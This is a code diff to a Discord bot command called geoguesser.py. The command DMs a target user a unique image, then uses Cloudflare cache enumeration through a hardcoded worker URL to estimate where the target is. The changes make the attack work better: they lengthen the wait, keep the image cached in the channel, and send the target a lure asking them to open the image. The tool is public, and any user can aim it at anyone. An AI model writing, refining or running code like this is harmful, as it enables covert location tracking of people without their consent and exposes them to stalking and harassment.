@@ -1,12 +1,9 @@
 """
-
-made by zaneok dont larp
-
-
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
 then uses Cloudflare cache enumeration to estimate their location.
 Public command – anyone can use it.
+FIX: increased wait time, keep image in channel, add reminder to target.
 """
 
 import asyncio
@@ -21,6 +18,8 @@ import traceback
 
 # ============ CONFIGURATION ============
 WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
+WAIT_SECONDS = 30  # increased from 12 to give target time to open DM
+KEEP_IMAGE_IN_CHANNEL = True  # if True, do not delete the upload message
 # =======================================
 
 # Approximate coordinates for Cloudflare colos
@@ -119,11 +118,18 @@ async def run(client, message, args):
                 return
             image_url = sent.attachments[0].url
 
-            # Delete temporary upload message (don't crash if already gone)
-            try:
-                await sent.delete()
-            except discord.NotFound:
-                pass
+            # Keep the image in channel to ensure Cloudflare caches it
+            if not KEEP_IMAGE_IN_CHANNEL:
+                try:
+                    await sent.delete()
+                except discord.NotFound:
+                    pass
+            else:
+                # Optionally edit the message to indicate it's part of the scan
+                try:
+                    await sent.edit(content="🔍 Image used for geolocation scan (will be deleted after scan)")
+                except:
+                    pass
         except Exception as e:
             await message.channel.send(f"❌ Failed to upload image: {e}")
             return
@@ -137,19 +143,35 @@ async def run(client, message, args):
         img_bytes.seek(0)
         try:
             await target.send(file=discord.File(img_bytes, filename="geo.png"))
+            # Also send a follow-up message to remind them to open the image
+            try:
+                await target.send("👀 Please open the image I just sent to help with the geolocation scan. (The image will be used to determine your approximate region via Cloudflare cache.)")
+            except:
+                pass
         except discord.Forbidden:
             await message.channel.send("❌ Cannot DM that user (DMs closed).")
+            # If we kept the image in channel, we may want to delete it now
+            if KEEP_IMAGE_IN_CHANNEL:
+                try:
+                    await sent.delete()
+                except:
+                    pass
             return
         except Exception as e:
             await message.channel.send(f"❌ DM failed: {e}")
+            if KEEP_IMAGE_IN_CHANNEL:
+                try:
+                    await sent.delete()
+                except:
+                    pass
             return
 
-        # Wait for cache propagation
+        # Wait for cache propagation – longer time
         try:
-            await status_msg.edit(content="⏳ Waiting 12 seconds for cache & notifications...")
+            await status_msg.edit(content=f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
         except discord.NotFound:
-            status_msg = await message.channel.send("⏳ Waiting 12 seconds for cache & notifications...")
-        await asyncio.sleep(12)
+            status_msg = await message.channel.send(f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
+        await asyncio.sleep(WAIT_SECONDS)
 
         # Enumerate Cloudflare cache
         try:
@@ -179,7 +201,16 @@ async def run(client, message, args):
         checked = data.get('checked', 0)
 
         if not datacenters:
-            await message.channel.send("❌ No cache hits. Target may not have downloaded the image. Try again later.")
+            await message.channel.send(
+                "❌ No cache hits. The target may not have downloaded the image, or the cache hasn't propagated yet. "
+                "Try again with a longer wait (edit WAIT_SECONDS in the command) or ensure the target opens the image."
+            )
+            # Optionally delete the kept image
+            if KEEP_IMAGE_IN_CHANNEL:
+                try:
+                    await sent.delete()
+                except:
+                    pass
             return
 
         coords = []
@@ -237,6 +268,13 @@ async def run(client, message, args):
             await status_msg.delete()
         except discord.NotFound:
             pass
+
+        # Delete the kept image if we want to clean up
+        if KEEP_IMAGE_IN_CHANNEL:
+            try:
+                await sent.delete()
+            except:
+                pass
 
         # Send final result
         await message.channel.send(embed=embed)
